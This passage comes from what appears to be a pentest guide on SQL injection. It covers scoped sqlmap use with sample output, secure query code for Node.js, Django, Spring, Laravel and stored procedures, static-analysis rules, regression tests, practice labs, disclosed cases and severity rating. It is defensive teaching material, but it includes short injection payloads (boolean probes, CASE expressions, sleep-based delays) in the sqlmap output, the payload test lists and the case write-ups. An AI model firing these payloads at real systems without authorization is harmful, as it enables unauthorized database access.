| `--risk 2` and `--risk 3` | The usage guide says risk 2 adds heavy-query time-based tests and risk 3 adds `OR`-based payloads, which can update every row of a table in an `UPDATE` injection |
| `--level` above 1 across all parameters | Tests far more parameters and headers; name the parameter with `-p` instead |
| `--tamper`, `--skip-waf` | WAF evasion is out of scope |
| `--dns-domain` | DNS exfiltration of query results |
| `--crawl`, `--forms` | Discovers and tests inputs you have not reviewed, including write forms |
| The auxiliary switches `--graphql`, `--hql`, `--nosql`, `--ldap`, `--xpath`, `--ssti`, `--xxe` | At the time of writing, the usage guide says these confirm the injection and then automatically extract whatever the vector reaches, ignoring the enumeration options. For GraphQL and HQL use classic SQL mode with the `*` marker instead |

Do not point sqlmap at endpoints that write (sign-up, profile update, order creation) unless the client agrees and the target records are your own: every probe is an `INSERT` or `UPDATE`.

#### Observation

Illustrative, shortened:

```text
[INFO] POST parameter 'JSON #1*' is 'Generic boolean-based blind - WHERE or HAVING clause' injectable
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Payload: {"variables": {"f": "gifts' AND 4512=4512 AND 'aBcD'='aBcD"} }
---
[INFO] the back-end DBMS is PostgreSQL
banner: 'PostgreSQL 16.4 on x86_64-pc-linux-gnu'
current user: 'shop_app'
current database: 'shop'
```

#### Evaluation

- **Fail (confirmed):** sqlmap reports the parameter injectable and returns the banner or current user, consistent with your manual finding.
- **Inconclusive:** sqlmap finds nothing on a manual lead. That is common for ORDER BY, second-order and JSON-wrapped cases; your manual evidence still stands if it meets the criteria of tests 2 to 10.

#### False positives

sqlmap's heuristics can misread dynamic content (timestamps, CSRF tokens, ads) as boolean differences. If it reports only a boolean injection on a page with changing content, set `--string` or `--not-string` to a marker from your manual pair, and rerun once. Treat any result that contradicts your manual tests as unconfirmed.

#### Automation

This test is the automation; keep it scoped to confirmed leads. In CI, run DAST (Burp Suite DAST, ZAP active scan) against a test environment seeded with test data, never against production.

## Secure implementation

### Design rules

1. **Bind every value.** Use the ORM's normal query API or a parameterised query for every value that is not a constant in your code: request data, stored data, data from other services, file contents. This is ASVS `v5.0.0-1.2.4` (L1), and it covers second-order injection for free, because "trusted because it came from our own database" stops mattering.
2. **Map every identifier and keyword.** Table names, column names, sort direction, operators and functions come from fixed, application-owned maps, keyed by what the client is allowed to ask for. Reject unknown keys (`400`) instead of falling back silently, so tests can see the rule. Quoting an identifier keeps the syntax valid but does not decide *which* columns are allowed.
3. **Build lists with one placeholder per element** (or a driver feature that binds arrays), after validating each element's type.
4. **Treat raw-SQL APIs as reviewed code.** `whereRaw`, `$queryRawUnsafe`, `sequelize.literal`, `.extra()`, `RawSQL`, `createNativeQuery`: allow them only with bound values, flag them in code review, and cover them with static analysis.
5. **Keep stored procedures static,** or bind values inside them when they must build SQL.
6. **Validate input against business rules as well** (`v5.0.0-2.2.1`, L1): a product ID is a positive integer, a country is one of a list. Validation is a second layer that also limits what reaches error messages; it is not the injection defence.
7. **Least privilege for the database account** (`v5.0.0-13.2.2`, L2) and **generic error responses** (`v5.0.0-16.5.1`, L2). Neither prevents injection; both cap the damage and the information an attacker gets.
8. **Do not escape by hand** and do not rely on a WAF. The OWASP SQL Injection Prevention Cheat Sheet calls manual escaping strongly discouraged; a WAF is a temporary mitigation while the code is fixed.

### Node.js

node-postgres and mysql2 take values separately from the SQL text:

```javascript
// node-postgres: $1, $2 placeholders
const { rows } = await pool.query(
  "SELECT id, name, price FROM products WHERE category = $1 AND visible = true",
  [req.query.category]
);

// node-postgres: bind a whole array for an IN-style filter
const ids = (req.body.ids || []).map(Number);
if (!ids.length || !ids.every(Number.isSafeInteger)) return res.status(400).json({ error: "invalid ids" });
const orders = await pool.query(
  "SELECT id, total FROM orders WHERE owner_id = $1 AND id = ANY($2::int[])",
  [req.user.id, ids]
);

// mysql2: execute() uses a server-side prepared statement; one ? per list element
const [rows2] = await conn.execute(
  `SELECT id, total FROM orders WHERE owner_id = ? AND id IN (${ids.map(() => "?").join(",")})`,
  [req.user.id, ...ids]
);
```

Prisma's `$queryRaw` is a tagged template: interpolated values become parameters. `$queryRawUnsafe` takes a plain string and does not.

```javascript
import { Prisma } from "@prisma/client";

// Safe: values are bound
const products = await prisma.$queryRaw`SELECT id, name FROM "Product" WHERE category = ${category}`;
const mine = await prisma.$queryRaw`SELECT id FROM "Order" WHERE id IN (${Prisma.join(ids)})`;

// Unsafe: string built before Prisma sees it
// await prisma.$queryRawUnsafe(`SELECT id FROM "Product" WHERE category = '${category}'`);
```

Sequelize and Knex:

```javascript
// Sequelize: replacements (escaped by Sequelize) or bind (sent to the database separately)
const rows3 = await sequelize.query(
  "SELECT id, name FROM products WHERE category = :category",
  { replacements: { category }, type: QueryTypes.SELECT }
);
// Never: sequelize.literal(req.query.anything) or order: [[req.query.sort, "ASC"]]

// Knex: ? for values, ?? for identifiers (still allow-list the identifier)
const rows4 = await knex("products").whereRaw("price > ?", [Number(req.query.min)]);
```

Sorting with an allow-list. Use a `Map` rather than an object literal, so a key such as `constructor` or `__proto__` cannot pick up something from the prototype (ASVS `v5.0.0-15.3.6` makes the same recommendation for prototype pollution):

```javascript
const SORT = new Map([["price", "price"], ["name", "name"], ["newest", "created_at"]]);
const DIR = new Map([["asc", "ASC"], ["desc", "DESC"]]);

const col = SORT.get(req.query.sort ?? "name");
const dir = DIR.get(req.query.dir ?? "asc");
if (!col || !dir) return res.status(400).json({ error: "invalid sort" });

const { rows: sorted } = await pool.query(
  `SELECT id, name, price FROM products WHERE category = $1 ORDER BY ${col} ${dir} LIMIT $2`,
  [req.query.category, 50]
);
```

The template literal is safe here only because `col` and `dir` can hold nothing but the constants in the maps.

### Django

The ORM parameterises filters, and `id__in` binds lists. For raw SQL, pass `params` and leave placeholders unquoted; Django's documentation warns against both string formatting and quoting `%s`.

```python
from django.db import connection
from django.db.models.expressions import RawSQL

# ORM
products = Product.objects.filter(category=category, visible=True)
orders = Order.objects.filter(owner=request.user, id__in=ids)   # ids validated as ints

# Raw queries: params, unquoted placeholders
people = Person.objects.raw("SELECT * FROM shop_person WHERE last_name = %s", [last_name])

with connection.cursor() as cursor:
    cursor.execute("SELECT id, total FROM shop_order WHERE owner_id = %s AND status = %s",
                   [request.user.id, status])

# RawSQL also takes params
qs = Product.objects.annotate(rank=RawSQL("SELECT score FROM shop_rank WHERE product_id = shop_product.id AND region = %s", (region,)))

# Wrong: f-strings, % formatting, or "'%s'" in the SQL
# Person.objects.raw(f"SELECT * FROM shop_person WHERE last_name = '{last_name}'")
```

`order_by()` raises an error for unknown fields, but it accepts any field and related lookup on the model (`owner__password`), so map user choices:

```python
SORT_FIELDS = {"price": "price", "-price": "-price", "name": "name", "newest": "-created_at"}

def product_list(request):
    sort = request.GET.get("sort", "name")
    if sort not in SORT_FIELDS:
        return JsonResponse({"error": "invalid sort"}, status=400)
    qs = Product.objects.filter(visible=True).order_by(SORT_FIELDS[sort])
    ...
```

In Django REST framework, set `ordering_fields` explicitly on views that use `OrderingFilter`; DRF's documentation says that without it the filter allows ordering by any readable field on the serializer. Replace `.extra()` with annotations, `RawSQL` with `params`, or subqueries.

### Spring and Java

`JdbcTemplate` and `NamedParameterJdbcTemplate` bind values; the named variant expands a collection into an `IN` list:

```java
List<Product> products = jdbcTemplate.query(
    "SELECT id, name, price FROM products WHERE category = ? AND visible = true",
    productRowMapper, category);

MapSqlParameterSource params = new MapSqlParameterSource()
    .addValue("owner", ownerId)
    .addValue("ids", ids);                       // List<Long>, validated
List<Order> orders = namedJdbc.query(
    "SELECT id, total FROM orders WHERE owner_id = :owner AND id IN (:ids)",
    params, orderRowMapper);
```

JPA, Hibernate and Spring Data: named parameters in JPQL/HQL, never concatenation (CWE-564):

```java
TypedQuery<Order> q = em.createQuery(
    "select o from Order o where o.owner.id = :owner and o.status = :status", Order.class);
q.setParameter("owner", ownerId);
q.setParameter("status", status);

public interface OrderRepository extends JpaRepository<Order, Long> {
    @Query("select o from Order o where o.owner.id = :owner and o.status = :status")
    List<Order> findMine(@Param("owner") Long owner, @Param("status") String status, Sort sort);
}
```

Build the `Sort` from an allow-list. Spring Data JPA rejects function calls in `Sort` by default and offers `JpaSort.unsafe` to allow them; never pass request data to `JpaSort.unsafe`.

```java
private static final Map<String, String> SORT = Map.of(
    "price", "price", "name", "name", "newest", "createdAt");

Sort toSort(String sortParam, String dirParam) {
    String property = sortParam == null ? "name" : SORT.get(sortParam);
    if (property == null) throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "invalid sort");
    Sort.Direction dir = Sort.Direction.fromOptionalString(dirParam).orElse(Sort.Direction.ASC);
    return Sort.by(dir, property);
}
```

Plain JDBC: `PreparedStatement` with `setString`/`setLong`; `Statement.execute(String)` with built strings is the pattern to remove.

### Laravel and PHP

The query builder binds values in `where`, `whereIn` and the `*Raw` methods when you pass the bindings array. Column arguments are not bound: Laravel's documentation states that PDO cannot bind column names and that user input must never choose them, including for `order by`.

```php
use Illuminate\Support\Facades\DB;
use Illuminate\Validation\Rule;

$validated = $request->validate([
    'category' => ['required', 'string', 'max:50'],
    'sort'     => ['nullable', Rule::in(['price', 'name', 'created_at'])],
    'dir'      => ['nullable', Rule::in(['asc', 'desc'])],
    'ids'      => ['array'],
    'ids.*'    => ['integer'],
]);

$products = DB::table('products')
    ->where('category', $validated['category'])
    ->where('visible', true)
    ->orderBy($validated['sort'] ?? 'name', $validated['dir'] ?? 'asc')
    ->get();

$orders = Order::where('owner_id', $request->user()->id)
    ->whereIn('id', $validated['ids'] ?? [])
    ->get();

$expensive = Order::whereRaw('total > ?', [$min])->get();                          // bound
$rows = DB::select('SELECT id FROM orders WHERE status = ?', [$request->input('status', 'open')]);  // bound

// Wrong: Order::whereRaw("total > $min"), ->orderByRaw($request->sort), DB::raw($request->input('expr'))
```

Plain PDO: turn off emulated prepares so the server does the binding, and set the character set in the DSN:

```php
$pdo = new PDO('mysql:host=db;dbname=shop;charset=utf8mb4', $user, $pass, [
    PDO::ATTR_ERRMODE          => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES => false,
]);
$stmt = $pdo->prepare('SELECT id, name FROM products WHERE category = :category');
$stmt->execute(['category' => $category]);
```

### Identifiers: allow-lists instead of parameters

The pattern is the same in every language: the request carries a **key**, the code holds the **SQL**.

```python
REPORTS = {
    "sales":   ("sales_summary",  {"region", "month", "total"}),
    "refunds": ("refund_summary", {"region", "month", "amount"}),
}

def report_query(report_key, columns):
    if report_key not in REPORTS:
        raise ValueError("unknown report")
    table, allowed = REPORTS[report_key]
    if not columns or not set(columns) <= allowed:
        raise ValueError("unknown column")
    cols = ", ".join(sorted(columns))          # only names from the allow-list
    return f"SELECT {cols} FROM {table} WHERE tenant_id = %s"
```

Identifier-quoting helpers (Knex `??`, PostgreSQL `format('%I', …)` and `quote_ident`, SQL Server `QUOTENAME`) are useful as a second layer once the allow-list has picked the name, never instead of it. For multi-tenant designs that switch tables or schemas per tenant, derive the name from the authenticated tenant on the server, not from a request parameter, and see [multi-tenant isolation](/web/web-multi-tenant-isolation/).

### Stored procedures

Keep procedures static where you can. When a procedure must build SQL, bind values with the engine's dynamic-SQL parameter feature and pick identifiers from a fixed `CASE`.

SQL Server, with `sp_executesql` and `QUOTENAME`:

```sql
CREATE PROCEDURE dbo.search_orders
    @status nvarchar(20),
    @sort   sysname
AS
BEGIN
    SET NOCOUNT ON;
    DECLARE @col sysname = CASE @sort
        WHEN N'total'   THEN N'total'
        WHEN N'created' THEN N'created_at'
        ELSE N'id' END;
    DECLARE @sql nvarchar(max) =
        N'SELECT id, total FROM dbo.orders WHERE status = @status ORDER BY ' + QUOTENAME(@col);
    EXEC sys.sp_executesql @sql, N'@status nvarchar(20)', @status = @status;
END
```

PostgreSQL PL/pgSQL, with `EXECUTE … USING` for values and `format('%I')` for the mapped identifier:

```sql
CREATE FUNCTION search_orders(p_status text, p_sort text)
RETURNS SETOF orders
LANGUAGE plpgsql AS $$
DECLARE
    v_col text := CASE p_sort WHEN 'total' THEN 'total' WHEN 'created' THEN 'created_at' ELSE 'id' END;
BEGIN
    RETURN QUERY EXECUTE format('SELECT * FROM orders WHERE status = $1 ORDER BY %I', v_col)
        USING p_status;
END;
$$;
```

Oracle PL/SQL follows the same rule with `EXECUTE IMMEDIATE … USING` and `DBMS_ASSERT` for identifiers.

### Database account and error handling

- **One account per purpose.** The web application's account gets `SELECT`, `INSERT`, `UPDATE`, `DELETE` on its own tables and nothing else: no DDL, no ownership of the schema, no superuser or DBA role, no `FILE` privilege (MySQL), no `pg_read_server_files`, `pg_write_server_files` or `pg_execute_server_program` membership (PostgreSQL), no `sysadmin` (SQL Server), and no grants on network packages such as `UTL_HTTP` and `UTL_INADDR` (Oracle) unless needed. Reporting features get a separate read-only account, ideally on views. Migrations run with a different account from the application. The OWASP Database Security Cheat Sheet and the least-privilege section of the SQL Injection Prevention Cheat Sheet cover the details.
- **Disable what you do not use:** `xp_cmdshell` stays off on SQL Server; untrusted procedural languages and file-access extensions are not installed on PostgreSQL.
- **Generic errors in production** (`v5.0.0-16.5.1`): Django `DEBUG = False`; Laravel `APP_DEBUG=false`; Spring Boot keeps `server.error.include-stacktrace=never` and `server.error.include-message=never` (its defaults); Express error handlers that return a fixed body and log the detail server-side. Log the database exception with a correlation ID instead of returning it.
- **Monitor:** database syntax errors in production are rare in healthy applications. Alerting on them catches both bugs and attackers probing with quotes.

### Static analysis

Data-flow rules find concatenated queries far better than grep. Rule and query IDs at the time of writing:

| Tool | Rules / queries | Covers |
|---|---|---|
| CodeQL | `js/sql-injection`, `py/sql-injection`, `java/sql-injection`, `java/concatenated-sql-query`, `cs/sql-injection` | Taint from request sources to SQL sinks (including common ORMs and query builders) |
| Semgrep (semgrep-rules repository) | `python/django/security/injection/sql/` (`sql-injection-using-raw`, `sql-injection-using-rawsql`, `sql-injection-using-extra-where`), `python/django/security/audit/raw-query.yaml` | Django `raw()`, `RawSQL`, `.extra()` with request data |
| Semgrep | `java/lang/security/audit/formatted-sql-string.yaml`, `java/lang/security/audit/sqli/jdbc-sqli.yaml` | Formatted or concatenated SQL passed to JDBC |
| Semgrep | `javascript/express/security/injection/tainted-sql-string.yaml`, `javascript/sequelize/security/audit/sequelize-injection-express.yaml` | Express request data in SQL strings and Sequelize raw queries |
| Semgrep | `php/lang/security/injection/tainted-sql-string.yaml`, `php/laravel/security/laravel-sql-injection.yaml` | PHP and Laravel raw query methods |

Add a cheap project-specific rule as well: fail the build on any new use of `$queryRawUnsafe`, `sequelize.literal`, `.extra(`, `JpaSort.unsafe` or `orderByRaw(` without a reviewer's suppression comment.

### Regression tests

Write tests that send malicious-looking input and assert that the application treats it as data: either a validation error, or the same result as any other non-matching value, and never a `5xx` or driver error text. Keep the payloads in one shared list and reuse it across endpoints.

```python
# tests/test_sql_injection.py  (pytest + Django test client)
import pytest

PAYLOADS = ["'", "''", "\\", "1003-1", "gifts' AND '1'='2", "1) AND (1=2", "%", "_", "(CASE WHEN 1=1 THEN name ELSE price END)"]
DB_ERRORS = ["syntax error", "SQLSTATE", "ORA-", "Unclosed quotation", "ProgrammingError", "near \""]

@pytest.mark.parametrize("payload", PAYLOADS)
def test_category_is_data(client_user_a, payload):
    r = client_user_a.get("/api/products", {"category": payload})
    assert r.status_code in (200, 400)
    assert not any(e in r.content.decode() for e in DB_ERRORS)
    if r.status_code == 200:
        assert r.json()["count"] == 0            # nothing matches a literal payload

@pytest.mark.parametrize("sort", ["nosuchcolumn", "1", "price,name", "(CASE WHEN 1=1 THEN name ELSE price END)", "owner__password"])
def test_sort_is_allow_listed(client_user_a, sort):
    r = client_user_a.get("/api/products", {"category": "gifts", "sort": sort})
    assert r.status_code == 400

def test_stored_value_round_trips(client_user_a):
    name = "GT'; SELECT 1--"
    assert client_user_a.put("/api/me", {"display_name": name}, content_type="application/json").status_code == 200
    assert client_user_a.get("/api/me").json()["display_name"] == name
    assert client_user_a.get("/api/reports/activity").status_code == 200   # second-order reader
```

The same idea in JavaScript with Jest and supertest:

```javascript
const request = require("supertest");
const app = require("../app");

const PAYLOADS = ["'", "''", "1003-1", "gifts' AND '1'='2", "1) AND (1=2"];

describe.each(PAYLOADS)("search treats %p as data", (payload) => {
  test("no 5xx, no driver error", async () => {
    const res = await request(app).get("/api/products").query({ category: payload }).set("Cookie", testSessionCookie);
    expect([200, 400]).toContain(res.status);
    expect(res.text).not.toMatch(/syntax error|SQLSTATE|ORA-|Unclosed quotation/i);
  });
});

test("unknown sort field is rejected", async () => {
  const res = await request(app).get("/api/products").query({ category: "gifts", sort: "nosuchcolumn" }).set("Cookie", testSessionCookie);
  expect(res.status).toBe(400);
});
```

These tests do not prove the absence of SQLi, but they catch the regressions that matter: a new raw query, a sort parameter that bypasses the map, an error handler that starts leaking driver messages. Pair them with the static-analysis rules, which see code paths the tests do not exercise.

## Practice labs

Labs are where you can go further than the client rules allow (UNION extraction, data retrieval), which is useful for understanding impact. Keep the habits from this note anyway: one changed input at a time, a control for every signal.

**PortSwigger Web Security Academy** (free; the out-of-band lab needs Burp Suite Professional for Collaborator):

- [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data): the basic string context in a category filter.
- [SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass): why comment and `OR` payloads in login queries are dangerous on real systems.
- [Querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle) and [on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft): the version-banner proof from test 6.
- [UNION attack, determining the number of columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text): the UNION mechanics behind test 6.
- [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses) and [with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors): boolean detection in a tracking cookie (tests 3 and 9).
- [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based): type-conversion errors that carry data (test 6).
- [Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays): test 4.
- [Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band): test 5.

**OWASP Juice Shop** ([companion guide, Injection](https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html)): *Login Admin*, *Login Bender* and *Login Jim* (login query injection), *Christmas Special* (blind injection to reach a deleted product), *Ephemeral Accountant* (log in as a user that does not exist), and *Database Schema* and *User Credentials* (UNION extraction, lab only).

**OWASP crAPI** ([challenges](https://github.com/OWASP/crAPI/blob/develop/docs/challenges.md)): Challenge 13, redeeming an already-claimed coupon through SQL injection in the coupon flow. Challenge 12 next to it is the NoSQL counterpart.

**VAmPI** ([repository](https://github.com/erev0s/VAmPI)): a deliberately vulnerable REST API whose vulnerability list includes SQL injection; good for practising sqlmap with a saved request and the conservative flags in test 12.

## Real-world cases

- **Time-based proof on a GraphQL endpoint (HackerOne, 2018).** The `embedded_submission_form_uuid` query-string parameter on HackerOne's own `/graphql` endpoint was injectable on PostgreSQL. The report's proof is the one test 4 recommends: stacked `pg_sleep(5)` and `pg_sleep(1)` payloads that produced matching response times. HackerOne's summary says the flaw allowed reading data from its database schemas and that it found no evidence of exploitation. Rated Critical; disclosed November 2018. [HackerOne report 435066](https://hackerone.com/reports/435066).
- **Array parameter on a reporting page (Valve, 2018).** An unvalidated `countryFilter[]` parameter on a partner reporting page (`report_xml.php`) allowed reading SQL data from its backing database, per Valve's summary. Rated Critical, with a USD 25,000 bounty shown on the report; disclosed July 2018. A reminder to test every element of array parameters (test 8). [HackerOne report 383127](https://hackerone.com/reports/383127).
- **SQL injection through an XML document (Starbucks, 2019).** A web service backed by Microsoft Dynamics AX accepted XML-formatted requests; the researcher found the injection inside the XML payload, which reached an enterprise accounting database. The researcher's write-up notes that verbose error messages were what helped craft a valid document, which is the error-disclosure point from [Verbose database errors](#verbose-database-errors). Rated Critical; disclosed August 2019. [HackerOne report 531051](https://hackerone.com/reports/531051).
- **Injection inside base64-encoded JSON (Uber, 2016).** An unsubscribe link carried a base64-encoded JSON parameter `p`; its `user_id` field was concatenated into a MySQL query, and `sleep(12)` inside the decoded field delayed the response. The reporter limited the proof to the database user and name. Bounty USD 4,000 shown on the report; disclosed July 2016. This is the encoded-wrapper case in test 9. [HackerOne report 150156](https://hackerone.com/reports/150156).
- **Pre-authentication SQLi through the `Authorization` header (Fortinet FortiWeb, CVE-2025-25257).** watchTowr's analysis shows the Fabric Connector parsing `Authorization: Bearer <token>` and formatting the token into a MySQL `SELECT … WHERE token='%s'` with `snprintf`; the fix moved to a prepared statement. The write-up then explains how the database's file-write capability turned the injection into code execution, which is the escalation this note describes but does not test. [watchTowr Labs](https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/), [NVD CVE-2025-25257](https://nvd.nist.gov/vuln/detail/CVE-2025-25257).
- **Mass exploitation of a file-transfer product (Progress MOVEit Transfer, CVE-2023-34362).** CISA and the FBI report that from 27 May 2023 the CL0P ransomware group exploited a previously unknown SQL injection in MOVEit Transfer to install a web shell (LEMURLOOT) and steal data from the underlying databases of many organisations. The extreme end of the rating scale: unauthenticated, internet-facing, automated. [CISA advisory AA23-158A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a), [NVD CVE-2023-34362](https://nvd.nist.gov/vuln/detail/CVE-2023-34362).

More write-ups are collected in [Bug Bounty Writeups](/bug-bounty-writeups/).

## Rating findings

Rate on what the injection can reach, not on how hard it was to confirm. Blind injection is slower to exploit, but it reads the same data as a UNION. The factors that move severity are: authentication required (none, any registered user, a privileged role), the privileges of the database account (read-only on one schema, schema owner, superuser), what the database holds (PII, credentials, payment data), whether stacked queries or engine features reach the file system or OS, and who triggers a second-order payload. CVSS v3.1 vectors below are examples; adjust them to what you confirmed and what the client told you about the account.

**Scope.** Series convention: Scope Unchanged when the impact stays inside the vulnerable application and its own database (the usual case, because the database is part of the application's security authority). Scope Changed when the injection clearly escapes it: the database account can run operating-system commands or write files on a host shared with other systems, or the database serves other applications whose data the account can reach. State which applies and why.

| Finding | Typical severity | Example CVSS v3.1 vector | Reasoning |
|---|---|---|---|
| Unauthenticated SQLi on an internet-facing application, account can read and write application data | Critical | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | Anyone can read and change the whole application database; `I:H/A:H` because the same account can modify and delete rows |
| Unauthenticated SQLi, account is superuser/DBA with OS command or file-write capability on a shared host | Critical | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` (10.0) | Impact escapes the application to the host and other services; describe the capability, do not demonstrate it |
| Unauthenticated blind SQLi, read-only account | Critical or High | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | Full read of what the account sees; rate Critical when that includes sensitive data at scale |
| Authenticated SQLi (any registered user) reading the database | High to Critical | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (8.8) | Registration is free, so `PR:L` is a thin barrier; Critical when the database holds other users' sensitive data |
| Blind SQLi limited to a low-privilege, read-only database user | High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | Confidentiality impact is still high (the account reads application tables); rate above the base score when data is sensitive |
| SQLi reachable only by an administrator role | Medium to High | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (7.2) | High when administrators are not meant to have server access, Medium where they already deploy code. Requires a privileged account, but grants database access beyond what the admin UI allows; higher if admin accounts are numerous or weakly protected |
| Second-order SQLi fired when an administrator views a report or a job runs | High | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H` (8.0) | Planted by a normal user; `UI:R` when a person must open the page, `UI:N` (8.8) when a scheduled job triggers it |
| ORDER BY or identifier injection confirmed by `CASE` pairs | Same as other SQLi | As above | Boolean-blind extraction works through `ORDER BY`; do not rate it down for the context |
| Identifier not injectable but not allow-listed (sort by hidden columns) | Low to Medium | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` (4.3) | Ordering oracle on fields the user should not see; Medium when the column is a secret (reset tokens) |
| LIKE wildcards in an exact-match lookup (CWE-155) | Low to Medium | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` (4.3) | Not SQLi; severity depends on what `%` matches (all discount codes, partial secrets) |
| Verbose database errors without confirmed injection (CWE-209) | Low | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) | Leaks engine, query shape and table names; rate the base score down where nothing sensitive is shown |
| ORM or driver version with a published SQLi advisory, feature not reachable | Info to Low | none | Report as a patching item; rate as SQLi if you show the vulnerable feature is used |

When you report, give: the exact request and injection point (location, encoding layers), the context (string, number, identifier, list, stored), the technique and the control that rules out noise (the `''` repair, the false member of the pair, the zero-delay request, the OOB control), the engine, version and current user if you reached test 6, and what the client told you about the account's privileges. State that no data was extracted and which payloads you used.

## Mapping

| Test | WSTG | ASVS 5.0 | CWE | OWASP Top 10 / API Top 10 |
|---|---|---|---|---|
| GT-WEB-SQLI-1 | WSTG-INJT-05, WSTG-INFO-06, WSTG-APIT-99 | v5.0.0-1.2.4 (context) | CWE-89 (context) | A05:2025 |
| GT-WEB-SQLI-2 | WSTG-INJT-05 (and DBMS sub-pages) | v5.0.0-1.2.4, v5.0.0-16.5.1 | CWE-89, CWE-209 | A05:2025; API8:2023 for verbose errors |
| GT-WEB-SQLI-3 | WSTG-INJT-05 (MS Access sub-page for `IIF`) | v5.0.0-1.2.4 | CWE-89 | A05:2025 |
| GT-WEB-SQLI-4 | WSTG-INJT-05 (MySQL, SQL Server, PostgreSQL sub-pages) | v5.0.0-1.2.4 | CWE-89 | A05:2025 |
| GT-WEB-SQLI-5 | WSTG-INJT-05 (Oracle, SQL Server sub-pages) | v5.0.0-1.2.4, v5.0.0-13.2.2 | CWE-89 | A05:2025 |
| GT-WEB-SQLI-6 | WSTG-INJT-05 (all DBMS sub-pages) | v5.0.0-1.2.4, v5.0.0-13.2.2 | CWE-89 | A05:2025 |
| GT-WEB-SQLI-7 | WSTG-INJT-05 | v5.0.0-1.2.4, v5.0.0-2.2.1 | CWE-89 | A05:2025 |
| GT-WEB-SQLI-8 | WSTG-INJT-05 (incl. SQL wildcard injection) | v5.0.0-1.2.4, v5.0.0-2.2.1 | CWE-89, CWE-155 | A05:2025 |
| GT-WEB-SQLI-9 | WSTG-INJT-05, WSTG-APIT-99 | v5.0.0-1.2.4, v5.0.0-1.1.1 | CWE-89 | A05:2025 |
| GT-WEB-SQLI-10 | WSTG-INJT-14, WSTG-INJT-05 | v5.0.0-1.2.4 | CWE-89 | A05:2025; API10:2023 when the data comes from a third-party API |
| GT-WEB-SQLI-11 | WSTG-INJT-05 (ORM injection sub-page, stored procedure injection) | v5.0.0-1.2.4 | CWE-89, CWE-564 | A05:2025 |
| GT-WEB-SQLI-12 | WSTG-INJT-05 (automated exploitation) | v5.0.0-1.2.4 | CWE-89 | A05:2025 |

ASVS levels: `v5.0.0-1.2.4` L1 (parameterised queries, ORMs or equivalent protection for SQL, HQL, NoSQL and Cypher, including in stored procedures), `v5.0.0-2.2.1` L1 (positive validation against allow-lists), `v5.0.0-1.1.1` L2 (decode once, before validation), `v5.0.0-13.2.2` L2 (least-privilege accounts for backend and data-layer connections), `v5.0.0-16.5.1` L2 (generic error messages, no stack traces or queries), `v5.0.0-15.3.6` L2 (prototype-safe JavaScript, used in the Node.js sort example). CWE choice: CWE-89 (*Improper Neutralization of Special Elements used in an SQL Command*) is the base-level entry and the default for every SQLi finding. CWE-564 is a variant for Hibernate HQL/SQL built from external input; use it when the sink is HQL or JPQL. CWE-943 (*Improper Neutralization of Special Elements in Data Query Logic*) is the class above both; MITRE marks it as allowed with review, so prefer CWE-89. CWE-209 (error messages containing sensitive information) and CWE-155 (wildcards) are for the side findings. `A05:2025` is Injection in the OWASP Top 10:2025, which lists CWE-89 and CWE-564 among its mapped CWEs. The OWASP API Security Top 10 2023 has no injection category of its own; `API10:2023` uses second-order SQLi through third-party data as an example scenario, and `API8:2023` covers error messages that expose stack traces.

## References

**OWASP**

- WSTG: [Testing for SQL Injection (WSTG-INJT-05)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/05-SQL_Injection) and its sub-pages [Oracle](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/05.1-Oracle), [MySQL](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/05.2-MySQL), [SQL Server](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/05.3-SQL_Server), [PostgreSQL](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/05.4-PostgreSQL), [MS Access](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/05.5-MS_Access), [ORM Injection](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/05.7-ORM_Injection); [Incubated Vulnerability (WSTG-INJT-14)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/14-Incubated_Vulnerability); [Testing GraphQL (WSTG-APIT-99)](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/12-API_Testing/99-GraphQL)
